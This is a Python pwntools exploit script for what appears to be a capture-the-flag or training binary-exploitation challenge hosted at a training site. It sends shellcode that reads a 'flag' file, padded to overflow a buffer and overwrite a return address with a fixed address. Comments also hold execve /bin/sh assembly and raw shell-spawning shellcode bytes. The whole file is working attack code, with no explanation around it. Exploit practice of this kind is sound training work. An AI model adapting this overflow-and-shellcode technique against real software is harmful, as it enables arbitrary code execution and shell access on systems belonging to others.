from pwn import *

run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/1/shellcode')
	#pid=gdb.attach(r)
	#input("wait")
else:
	r=remote("bin.training.jinblack.it",2001)


# jmp binsh
# beforethemove:
# mov rax, 0x3b
# pop rdi
# mov rsi, 0
# mov rdx, 0
# syscall
# binsh:
# call beforethemove
# nop
# nop
# nop

sc = shellcraft.amd64.linux.cat("flag",fd=1)

shellcode = asm(sc)
#shellcode = b"\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05/bin/sh\x00"
shellcode = shellcode.ljust(1016, b"A") + p64(0x0601080)

print(r.recvuntil(b"What is your name?\n"))
r.send(shellcode)

r.interactive()
